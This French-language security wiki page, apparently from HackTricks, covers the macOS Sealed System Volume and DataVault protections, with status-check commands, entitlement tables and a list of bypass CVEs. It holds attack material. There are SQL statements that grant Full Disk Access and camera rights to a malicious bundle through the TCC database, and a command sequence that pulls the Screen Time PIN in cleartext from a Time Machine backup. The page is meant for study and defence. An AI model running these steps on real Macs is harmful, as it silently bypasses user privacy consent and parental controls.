# macOS Sealed System Volume & DataVault

{{#include ../../../banners/hacktricks-training.md}}

## Volume système scellé (SSV)

### Informations de base

Depuis **macOS Big Sur (11.0)**, le volume système est scellé cryptographiquement à l'aide d'un **arbre de hachage de snapshot APFS**. C'est ce qu'on appelle le **Sealed System Volume (SSV)**. La partition système est montée en **lecture seule** et toute modification rompt le sceau, ce qui est vérifié lors du démarrage.<sup>[[11]](#references)</sup>

Le SSV fournit :
- **Détection des falsifications** — toute modification des binaires/frameworks système change la racine de l'arbre de Merkle et invalide le sceau signé par Apple
- **Authentification au démarrage** — la chaîne de démarrage vérifie le snapshot système sélectionné avant qu'il ne devienne le système de fichiers racine
- **Résistance aux rootkits** — même root ne peut pas remplacer de manière persistante des fichiers dans le snapshot système authentifié sans désactiver authenticated root ou compromettre un chemin de mise à jour autorisé

Le SSV protège le volume **System**, et non le volume **Data** accessible en écriture qui lui est associé. Les Firmlinks fusionnent les deux volumes dans l'espace de noms visible à `/`, donc un chemin qui semble accessible en écriture ne prouve pas que l'objet sous-jacent appartient au snapshot scellé. FileVault et Data Protection assurent la confidentialité des données au repos ; ils sont distincts de l'intégrité du SSV.<sup>[[11]](#references)</sup>

### Vérification de l'état du SSV
```bash
# Check if authenticated root is enabled (SSV seal verification)
csrutil authenticated-root status

# List APFS snapshots (the sealed snapshot is the boot volume)
diskutil apfs listSnapshots disk3s1

# Check mount status (should show read-only)
mount | grep " / "

# Show the volume group and the current Sealed field
diskutil apfs listVolumeGroups
diskutil apfs list | grep -B 8 -A 8 'Sealed:'
```
### Vue effective du système : SSV + greffes Cryptex

Dans les versions récentes de macOS, tous les exécutables visibles sous `/System` ne proviennent pas nécessairement de l’instantané SSV démarré. Les **Cryptexes** sont des images disque APFS authentifiées séparément, dont le contenu est greffé sur certains répertoires ; les Rapid Security Responses peuvent donc remplacer des composants sensibles à la sécurité sans reconstruire le SSV de base. Lors du triage de la persistence ou du diffing du code système, inventorie les montages actifs et le magasin Cryptex de Preboot au lieu de hasher uniquement l’instantané de base :
```bash
mount | grep -Ei 'cryptex|graft'
find /System/Volumes/Preboot/Cryptexes -maxdepth 4 -type d 2>/dev/null
```
Les détails concernant la chaîne de démarrage et Rapid Security Response sont présentés dans [macOS Architecture — Cryptexes](../mac-os-architecture/README.md#cryptexes-and-rapid-security-responses) ; cette section se concentre sur la limite du SSV elle-même.

### Entitlements des processus d’écriture SSV

Certains binaires système d’Apple disposent d’entitlements leur permettant de modifier ou de gérer le sealed system volume :

| Entitlement | Objectif |
|---|---|
| `com.apple.private.apfs.revert-to-snapshot` | Rétablir le system volume à un snapshot précédent |
| `com.apple.private.apfs.create-sealed-snapshot` | Créer un nouveau sealed snapshot après les mises à jour du système |
| `com.apple.rootless.install.heritable` | Écrire dans des chemins protégés par SIP (hérité par les processus enfants) |
| `com.apple.rootless.install` | Écrire dans des chemins protégés par SIP |

### Identifier les processus d’écriture SSV
```bash
# Search for binaries with SSV-related entitlements
find /System /usr -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "apfs.revert-to-snapshot\|apfs.create-sealed-snapshot\|rootless.install" && echo "{}"
' \; 2>/dev/null

# Using the scanner database
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'ssv_writer';"
```
### Scénarios d'attaque

#### Snapshot Rollback Attack

Si un attaquant compromet un binaire doté de `com.apple.private.apfs.revert-to-snapshot`, il peut **restaurer le volume système à un état antérieur à la mise à jour**, réactivant ainsi des vulnérabilités connues :
```bash
# Conceptual — the snapshot revert operation would:
# 1. List available snapshots
diskutil apfs listSnapshots disk3s1

# 2. Revert to an older snapshot (requires the entitlement)
# This restores the system to a state with known, patched vulnerabilities
```
> [!WARNING]
> La restauration d’un snapshot **annule effectivement les mises à jour de sécurité**, en restaurant des vulnérabilités précédemment corrigées du kernel et du système. Il s’agit de l’une des opérations les plus dangereuses possibles sur les versions modernes de macOS.

#### Remplacement de binaires système

Avec un bypass de SIP et la capacité d’écrire sur le SSV, un attaquant peut :

1. Monter le volume système en lecture-écriture
2. Remplacer un daemon système ou une bibliothèque de framework par une version trojanée
3. Re-scelller le snapshot (ou accepter le sceau invalide si SIP est déjà dégradé)
4. Le rootkit persiste après les redémarrages et est invisible pour les outils de détection userland

### CVE réelles

| CVE | Description |
|---|---|
| CVE-2021-30892 | **Shrootless** — bypass de SIP exploitant l’entitlement `com.apple.rootless.install.heritable` de `system_installd` pour exécuter des scripts post-installation arbitraires ([Microsoft](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/))<sup>[[1]](#references)</sup> |
| CVE-2022-22583 | Bypass de SIP : `system_installd` plaçait le script post-installation dans un dossier protégé par SIP sous `/tmp`, mais `/tmp` lui-même n’est pas protégé par SIP ; le dossier pouvait donc être remplacé en montant une image par-dessus ([Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html))<sup>[[2]](#references)</sup> |
| CVE-2022-46689 | **MacDirtyCow** — race condition copy-on-write dans XNU permettant d’écrire dans des fichiers en lecture seule appartenant à root ([Worth Doing Badly](https://worthdoingbadly.com/macdirtycow/))<sup>[[3]](#references)</sup> |

---

## DataVault

### Informations de base

**DataVault** est une protection de filesystem contrôlée par entitlement pour les fichiers et répertoires sensibles. Le flag BSD `UF_DATAVAULT` (`0x00000080`) indique qu’un objet nécessite un entitlement pour être lu ou modifié ; contrairement au DAC normal, le simple fait de devenir **root** ou de recevoir Full Disk Access ne suffit pas à satisfaire cette vérification tant que la protection est appliquée.<sup>[[4]](#references)[[13]](#references)</sup>

N’utilisez pas « DataVault » comme synonyme de toute base de données protégée. Les bases de données TCC sont régies par la policy spécifique de TCC/FDA et de SIP (voir [macOS TCC](macos-tcc/README.md)), tandis que l’accès aux éléments du keychain dépend également des ACL du Keychain et de la protection cryptographique (voir [macOS Keychain](../../macos-red-teaming/macos-keychain.md)). Les exemples réels de DataVault apparaissent généralement sous la forme de stores appartenant à des services sous `/private/var/folders/.../0/`, comme le store Screen Time ; le flag est visible sous la forme de `datavault` dans les flags de fichiers BSD lorsque le parent peut être interrogé avec `stat`.

### Entitlements des contrôleurs DataVault

| Entitlement | Boundary |
|---|---|
| `com.apple.rootless.datavault.controller` | Accéder aux objets `UF_DATAVAULT` et les gérer<sup>[[13]](#references)</sup> |
| `com.apple.private.tcc.manager` | Gérer les décisions TCC ; il s’agit d’une boundary de confidentialité connexe, mais distincte |
| `com.apple.private.tcc.allow` | Bypasser les services TCC sélectionnés indiqués dans la valeur de l’entitlement |
| `com.apple.rootless.storage.TCC` | Écrire dans le store TCC protégé par SIP |

Un processus qui combine un entitlement de contrôleur DataVault avec des fonctionnalités de FDA, de backup, d’indexation ou d’IPC est particulièrement intéressant : recherchez une primitive de confused deputy qui copie un objet protégé vers un chemin ordinaire plutôt que d’essayer d’ouvrir directement le vault.<sup>[[14]](#references)</sup>

### Recherche de contrôleurs DataVault
```bash
# BSD flags: a protected object is printed with the `datavault` keyword
ls -ldeO@ /private/var/folders/*/*/0/com.apple.ScreenTimeAgent 2>/dev/null
sudo find /private/var/folders -flags +datavault -print 2>/dev/null

# Find Apple binaries carrying DataVault/TCC controller entitlements
find /System /usr -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "datavault.controller\|private.tcc\|rootless.storage.TCC" && echo "{}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'datavault_controller';"
```
### Scénarios d’attaque

#### Modification directe de la base de données TCC (frontière TCC distincte)

Si un attaquant compromet un processus gestionnaire TCC (par exemple, via une injection de code dans un processus possédant `com.apple.private.tcc.manager`), il peut **modifier directement la base de données TCC** afin d’accorder n’importe quelle permission TCC à n’importe quelle application :<sup>[[12]](#references)</sup>
```sql
-- Grant Full Disk Access to a malicious binary (conceptual)
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceSystemPolicyAllFiles', 'com.attacker.malware', 0, 2, 4, 1);

-- Grant camera access without a prompt
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceCamera', 'com.attacker.malware', 0, 2, 4, 1);
```
> [!CAUTION]
> La modification de la base de données TCC est le **privacy bypass** ultime : elle accorde silencieusement n'importe quelle permission, sans invite utilisateur ni indicateur visible. Historiquement, plusieurs chaînes de privilege escalation macOS se sont terminées par des écritures dans la base de données TCC comme payload final.

#### Accès à la base de données du Keychain

L'accès brut à une base de données sous-jacente du Keychain n'est pas équivalent à l'accès aux secrets en texte clair. Même si une autre frontière de privilèges permet à un attaquant de copier la base de données, les clés cryptographiques et les ACL des éléments doivent encore être attaquées ; consultez plutôt la page dédiée au [macOS Keychain](../../macos-red-teaming/macos-keychain.md), au lieu de supposer qu'un entitlement DataVault-controller est suffisant.

#### Frontière de copie de sauvegarde : Time Machine

Une analyse de 2026 a démontré un pattern général utile : `backupd` possède à la fois `com.apple.rootless.datavault.controller` et Full Disk Access afin de pouvoir copier des stores protégés. Dans la configuration testée, `/private/var/folders` était inclus dans Time Machine et la copie de sauvegarde montée n'appliquait pas la frontière DataVault active. Le chercheur s'en est servi pour localiser le store SQLite de Screen Time et lire le PIN de restrictions en texte clair sans ouvrir le vault actif. Considérez ceci comme une **copy-boundary attack** : énumérez les deputies de backup, d'exportation, de migration, d'indexation et de diagnostic qui peuvent matérialiser les données du vault sous un mount ou un chemin soumis à des protections plus faibles.<sup>[[13]](#references)[[14]](#references)</sup>
```bash
# Confirm the deputy's privileges and whether the source tree is included
codesign -d --entitlements - /System/Library/CoreServices/TimeMachine/backupd 2>&1
tmutil isexcluded /private/var/folders

# Inspect the newest mounted backup; paths vary per host
backup="$(tmutil latestbackup)"
db="$(find "$backup/Data/private/var/folders" -path '*/com.apple.ScreenTimeAgent/Store/RMAdminStore-Local.sqlite' -print -quit 2>/dev/null)"
sqlite3 "$db" 'SELECT ZPASSCODE1 FROM ZCOREORGANIZATIONSETTINGS WHERE ZPASSCODE1 IS NOT NULL LIMIT 1;'
```
Ce comportement dépend de la version et de la disposition des sauvegardes. Validez-le sur la build cible et rappelez-vous qu'une destination Time Machine chiffrée ne protège la copie que lorsqu'elle est verrouillée ; une fois montée, ses contrôles d'accès font partie de la surface d'attaque.

### CVE réelles impliquant un bypass de DataVault/TCC

| CVE | Description |
|---|---|
| CVE-2024-44131 | Race condition de symlink dans FileProvider permettant à un helper privilégié d'accéder à des données protégées par TCC ([Jamf](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/))<sup>[[5]](#references)</sup> |
| CVE-2023-40424 | En tant que root, **créer un nouvel utilisateur dont `NFSHomeDirectory` pointe vers une `TCC.db` contrôlée par l'attaquant** ; lors de la connexion, `tccd` la consomme et les autorisations s'appliquent, permettant d'accéder aux données d'autres utilisateurs ([Kandji](https://blog.kandji.io/malware-bypass-tcc))<sup>[[6]](#references)</sup> |
| CVE-2021-30970 | « powerdir » : modifier le répertoire home de l'utilisateur pour y placer une TCC.db contrôlée par l'attaquant ([Microsoft](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/))<sup>[[7]](#references)</sup> |
| CVE-2021-30713 | Défaut de conclusion de bundle permettant à une app **d'hériter des autorisations TCC d'un bundle donateur** sans prompt ; exploité dans la nature par **XCSSET** pour effectuer des captures d'écran du bureau ([Jamf](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/))<sup>[[8]](#references)</sup> |
| CVE-2020-9934 | `tccd` construisait le chemin de la DB à partir de `$HOME`, donc `launchctl setenv HOME` le redirigeait vers une `TCC.db` contrôlée par l'attaquant ([Matt Shockley](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8))<sup>[[9]](#references)</sup> |
| CVE-2020-29621 | `coreaudiod` détenait `com.apple.private.tcc.manager` **et** désactivait la validation des libraries, de sorte qu'un plug-in HAL déposé dans `/Library/Audio/Plug-Ins/HAL` pouvait accorder des droits TCC arbitraires ([Wojciech Reguła](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/))<sup>[[10]](#references)</sup> |



## References

- [1] [Microsoft découvre une nouvelle vulnérabilité macOS, Shrootless, qui pourrait contourner la protection System Integrity Protection](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/)
- [2] [Analyse technique : CVE-2022-22583 - Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html)
- [3] [MacDirtyCow - Ça vaut la peine de mal faire les choses](https://worthdoingbadly.com/macdirtycow/)
- [4] [Apple Platform Security — Protection des données](https://support.apple.com/guide/security/data-protection-overview-sece3bee0835/web)
- [5] [Jamf Threat Labs - CVE-2024-44131 : le bypass de TCC vole des données depuis iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [Kandji - Découverte des malwares macOS : contourner TCC](https://blog.kandji.io/malware-bypass-tcc)
- [7] [Une nouvelle vulnérabilité macOS, « powerdir », pourrait entraîner un accès non autorisé aux données utilisateur](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [8] [Un bypass zero-day de TCC découvert dans le malware XCSSET](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [9] [CVE-2020–9934 : contourner le framework macOS Transparency, Consent, and Control (TCC)](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [10] [Jouer de la musique et contourner TCC, alias CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [11] [Le cauchemar des mises à jour OTA d'Apple (snapshots APFS)](https://jhftss.github.io/The-Nightmare-of-Apple-OTA-Update/)
- [12] [Objective-See — Exploitation de TCC](https://objective-see.org/blog/blog_0x4C.html)
- [13] [XNU `stat.h` — `UF_DATAVAULT`](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/stat.h)
- [14] [Comment contourner son propre code Screen Time — analyse du code source et de Time Machine/DataVault](https://tangled.org/dunkirk.sh/zera/commit/e6b6236c395e5c9ec1a27ad2a76217d8cc2b4312)
{{#include ../../../banners/hacktricks-training.md}}
